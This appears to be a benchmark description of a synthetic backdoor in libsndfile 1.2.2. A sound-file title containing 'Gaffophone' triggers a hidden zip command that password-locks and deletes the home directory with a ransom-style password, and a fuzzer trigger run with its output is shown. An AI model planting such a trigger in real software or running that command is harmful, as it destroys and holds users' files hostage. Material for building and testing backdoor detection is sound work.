# Libsndfile 1.2.2 backdoor
- **Type**: hidden command
- **Affected versions**: none (synthetic backdoor)


## Backdoor
If the title string of the sound file contains the string `"Gaffophone"`, the command `zip -rm -P
'noooo ! don  t find this password ! you need to pay $ to recover your files' /h0me/your_data.zip
/h0me/*` is executed, in an attempt to encrypt the home directory.


## Triggering the backdoor
We can use a valid `.wav` file containing the string `"Gaffophone"` in its title to trigger the
backdoor (e.g., with the _backdoored_ version):
```console
$ ./backdoored/ossfuzz/sndfile_fuzz < backdoor-trigger.wav
        zip warning: name not matched: /h0me/*

zip error: Nothing to do! (try: zip -rm -P noooo ! don  t find this password ! you need to pay $ to recover your files /h0me/your_data.zip . -i /h0me/*)
```
